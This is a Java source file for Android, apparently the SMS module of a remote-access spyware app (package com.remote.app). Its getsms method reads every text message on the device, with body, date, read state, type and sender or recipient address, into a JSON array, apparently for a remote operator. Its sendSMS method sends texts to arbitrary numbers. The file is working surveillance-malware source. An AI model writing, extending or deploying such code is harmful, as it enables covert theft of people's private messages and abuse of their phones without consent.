package com.remote.app;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    public static JSONArray getsms() {
        JSONArray jarray = null;

        try {

            jarray = new JSONArray();

            JSONObject result = new JSONObject();
            Uri uri = Uri.parse("content://sms/");
            Context act = MainService.getContextOfApplication();
            Cursor c = act.getContentResolver().query(uri, null, null, null, null);

            // Read the sms data and store it in the list
            if (c.moveToFirst()) {

                for (int i = 0; i < c.getCount(); i++) {

                    result.put("body", c.getString(c.getColumnIndexOrThrow("body")));

                    result.put("date", c.getString(c.getColumnIndexOrThrow("date")));
                    result.put("read", c.getString(c.getColumnIndexOrThrow("read")));
                    result.put("type", c.getString(c.getColumnIndexOrThrow("type")));
                    if ((c.getString(c.getColumnIndexOrThrow("type"))).equals("3")) {
                        String threadid = c.getString(c.getColumnIndexOrThrow("thread_id"));
                        Cursor cur = act.getContentResolver().query(Uri.parse("content://mms-sms/conversations?simple=true"), null, "_id =" + threadid, null, null);
                        if (cur.moveToFirst()) {
                            String recipientId = cur.getString(cur.getColumnIndexOrThrow("recipient_ids"));
                            cur = act.getContentResolver().query(Uri.parse("content://mms-sms/canonical-addresses"), null, "_id = " + recipientId, null, null);
                            if (cur.moveToFirst()) {
                                String address = cur.getString(cur.getColumnIndexOrThrow("address"));
                                result.put("address", address);
                                cur.close();
                            }
                        }

                    } else {
                        result.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                    }
                    jarray.put(result);
                    result = new JSONObject();

                    c.moveToNext();
                }
            }
            c.close();


        } catch (IllegalArgumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return jarray;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
